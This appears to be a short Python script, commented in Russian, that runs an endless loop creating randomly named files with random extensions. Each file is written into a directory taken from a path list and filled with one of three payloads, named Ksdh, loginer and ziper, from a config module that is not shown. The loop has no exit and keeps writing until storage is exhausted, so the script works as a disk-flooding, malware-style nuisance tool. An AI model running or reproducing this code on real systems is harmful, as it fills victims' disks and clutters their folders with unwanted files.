'''
# --- Переменные --- #
tree # Путя ко всем дерикториям
data # Данные для записи в файл
file_name # Имя файла
content_selection # Выбор содержимого файла

'''


import cfg
import func
import string
import random
from colorama import Fore, init, Style

# --- Иницализация colorama --- #
init()

# --- Переменные --- #
tree = func.tree() # Путя ко всем дерикториям
room = 0 # 


# --- ^ main ^ --- #
while True:
    # --- Генерация имени файла --- #
    file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + '.' + cfg.after_point[random.randint(0, len(cfg.after_point) - 1)]

    # --- ^ - ^ --- #
    print('File', Fore.CYAN + file_name, Style.RESET_ALL + 'successfully created')
    # --- />_</ --- #

    # --- Выбор содержимого файла --- #
    content_selection = random.randint(1, 3)
    if content_selection == 1:
        data = cfg.Ksdh
    elif content_selection == 2:
        data = cfg.loginer
    elif content_selection == 3:
        data = cfg.ziper

    # --- Создание и запись в файл --- #
    open(tree[room] + '\\' + file_name, 'w').write(data)
